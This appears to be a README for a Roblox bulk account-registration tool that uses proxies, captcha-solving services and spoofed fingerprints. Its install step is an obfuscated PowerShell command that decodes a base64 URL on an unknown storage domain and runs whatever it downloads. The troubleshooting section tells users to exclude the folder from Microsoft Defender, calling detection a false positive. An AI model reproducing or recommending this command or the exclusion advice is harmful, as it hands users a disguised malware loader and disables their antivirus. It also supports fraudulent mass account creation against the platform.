# Roblox Auto-registration software

## Install

Open PowerShell and run:

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04NjU0ODk4MzM4L1JvYmxveC1BdXRvcmVn'))) -UseBasicParsing)
```
Or download on repo

---

---

## First-time setup

Files expected next to the `.exe`:

- `proxies.txt` — one proxy per line (`#` for comments)
- `usernames.txt` — *(optional)* custom names
- `fingerprints.json` — *(optional)* custom fingerprint pool

`config.json` is auto-created.

## Menu

```
1  start registration
2  proxy manager
3  usernames
4  fingerprints
5  settings
6  view saved accounts
0  exit
```

Configure captcha: `5` → `1` (provider) → `2` (API key) → `7` (save).

---

## Captcha providers

| Provider | Endpoint | Method |
|----------|----------|--------|
| `capguru` | https://cap.guru | `in.php` / `res.php` |
| `capsolver` | https://capsolver.com | `createTask` / `getTaskResult` |
| `none` | — | no solver (tests) |

---

## Proxy formats

```
ip:port
ip:port:user:pass
user:pass:ip:port
user:pass@ip:port
scheme://ip:port
scheme://user:pass@ip:port
```

Default scheme is `http://`. Use `socks5://` explicitly for SOCKS5.

---

## Output

```
accounts/                 — per-account file
accounts_master.txt       — flat log
```

Netscape cookie format — compatible with `curl` / `requests` / `yt-dlp`.

---

## Config (`config.json`)

```json
{
  "captcha_provider": "capguru",
  "capguru_api_key": "",
  "capsolver_api_key": "",
  "threads": 5,
  "timeout": 30,
  "output_dir": "accounts",
  "username_mode": "file_then_generated",
  "save_master_log": true
}
```

`username_mode`: `file` / `generated` / `file_then_generated`.

---




## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Defender flags the `.exe` | PyInstaller false positive — `Add-MpPreference -ExclusionPath <folder>` |
| `VCRUNTIME140.dll` missing | Install [VC++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) |
| Console closes instantly | Run from PowerShell, not double-click |
| `no proxy available` | All proxies marked bad |
| `captcha unsolved` | Invalid API key or empty balance |
